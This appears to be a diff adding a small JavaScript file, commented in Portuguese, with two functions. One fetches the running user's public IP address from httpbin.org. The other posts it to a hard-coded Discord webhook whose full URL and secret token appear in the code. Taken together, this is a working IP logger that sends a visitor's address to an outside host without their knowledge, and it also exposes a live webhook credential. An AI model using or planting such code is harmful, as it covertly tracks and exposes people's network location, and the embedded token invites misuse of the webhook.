@@ -1,0 +1,35 @@
+// Função para buscar o endereço IP
+function getIPAddress() {
+    return fetch("https://httpbin.org/ip")
+        .then(response => response.json())
+        .then(data => data.origin)
+        .catch(error => {
+            console.error("Erro ao obter endereço IP:", error);
+            return null;
+        });
+}
+
+// Função para enviar o endereço IP para o Discord via webhook
+function sendToDiscord(ip) {
+    var webhookURL = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF";
+    var message = "Endereço IP: " + ip;
+
+    return fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error("Erro ao enviar mensagem para o webhook");
+        }
+        console.log("Mensagem enviada com sucesso!");
+    })
+    .catch(error => {
+        console.error(error);
+    });
+}
